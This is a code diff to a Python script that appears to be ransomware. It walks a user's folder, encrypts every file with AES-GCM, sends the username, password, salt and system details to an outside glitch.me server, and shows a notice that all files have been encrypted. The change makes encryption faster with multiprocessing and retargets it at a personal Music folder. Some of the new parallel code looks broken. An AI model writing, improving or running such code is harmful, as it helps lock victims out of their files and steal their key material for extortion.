@@ -16,8 +16,15 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
+import concurrent.futures
+import multiprocessing
+import logging
+from tqdm import tqdm
 
 SERVER_URL = 'https://respected-spiced-bobolink.glitch.me/store_data'
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 def get_mac_address():
     """Get the system's MAC address."""
@@ -74,28 +81,38 @@ def generate_key():
     """Generate a random 32-byte (256-bit) key."""
     return secrets.token_bytes(32)
 
-def encrypt_file(key, file_path):
-    """Encrypt a file using AES-GCM."""
-    if file_path.endswith('.enc'):
-        print(f"Skipping already encrypted file: {file_path}")
-        return
-
+def encrypt_chunk(chunk, key):
+    """Encrypt a chunk of data using AES-GCM."""
     iv = os.urandom(12)
     cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
     encryptor = cipher.encryptor()
+    encrypted_chunk = encryptor.update(chunk) + encryptor.finalize()
+    return iv + encryptor.tag + encrypted_chunk
 
-    try:
-        with open(file_path, 'rb') as file:
-            plaintext = file.read()
-            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+def encrypt_data(data, key, num_threads=4):
+    """Encrypt data using multithreading."""
+    chunk_size = len(data) // num_threads
+    chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+        encrypted_chunks = list(executor.map(lambda chunk: encrypt_chunk(chunk, key), chunks))
+    
+    return b''.join(encrypted_chunks)
 
-        encrypted_file_path = file_path + '.enc'
-        with open(encrypted_file_path, 'wb') as encrypted_file:
-            encrypted_file.write(iv + encryptor.tag + ciphertext)
-
-        secure_file_delete(file_path)
-    except Exception as e:
-        print(f"Error encrypting {file_path}: {e}")
+def encrypt_file(file_path, output_path, key, num_processes=4):
+    """Encrypt a file using multiprocessing."""
+    with open(file_path, 'rb') as f:
+        data = f.read()
+    
+    chunk_size = len(data) // num_processes
+    chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+    
+    with multiprocessing.Pool(processes=num_processes) as pool:
+        encrypted_chunks = pool.starmap(encrypt_data, [(chunk, key) for chunk in chunks])
+    
+    with open(output_path, 'wb') as f:
+        for chunk in encrypted_chunks:
+            f.write(chunk)
 
 def secure_file_delete(file_path):
     """Securely delete a file by overwriting it with random data."""
@@ -169,22 +186,16 @@ def get_system_info():
     return system_info
 
 def encrypt_all_data(key, data_source):
-    """Encrypt all files in a specified directory using multi-threading."""
-    threads = []
-    processed_files = set()
+    """Encrypt all files in a specified directory using multiprocessing."""
+    files_to_encrypt = []
     for root, dirs, files in os.walk(data_source):
         for file_name in files:
             file_path = os.path.join(root, file_name)
-            if file_path in processed_files:
-                continue
-
-            thread = threading.Thread(target=encrypt_file, args=(key, file_path))
-            thread.start()
-            threads.append(thread)
-            processed_files.add(file_path)
-
-    for thread in threads:
-        thread.join()
+            files_to_encrypt.append(file_path)
+    
+    with multiprocessing.Pool() as pool:
+        for _ in tqdm(pool.imap_unordered(lambda file_path: encrypt_file(file_path, file_path + '.enc', key), files_to_encrypt), total=len(files_to_encrypt)):
+            pass
 
 def send_data_to_server(username, password, salt, system_info, max_retries=5):
     """Send user data to the server with retries on failure."""
@@ -233,8 +244,10 @@ def show_notification(message):
 
 def main():
     home_directory = os.path.expanduser("~")
-    path = r"C:\Users\USER\Documents\Shaykhul\RockyRabbit\New folder"
+    path =  r"c:\Users\K H A N\Music"
 
+    logging.info("Starting encryption process...")
+    
     # Load existing password and salt or generate new ones
     password, salt = load_encryption_details()
     if password is None or salt is None:
@@ -257,7 +270,7 @@ def main():
     send_data_to_server(username, password, salt, system_info)
 
     sample_data = b"This is some sample data to be encrypted."
-    encrypted_data = encrypt_data(key, sample_data)
+    encrypted_data = encrypt_data(sample_data, key)
 
     with open('encrypted_data.bin', 'wb') as encrypted_data_file:
         encrypted_data_file.write(encrypted_data)
@@ -266,7 +279,7 @@ def main():
     
     # Show notification after encryption is complete
     show_notification("All files have been encrypted successfully!")
+    logging.info("Encryption process completed.")
 
 if __name__ == "__main__":
     main()
-
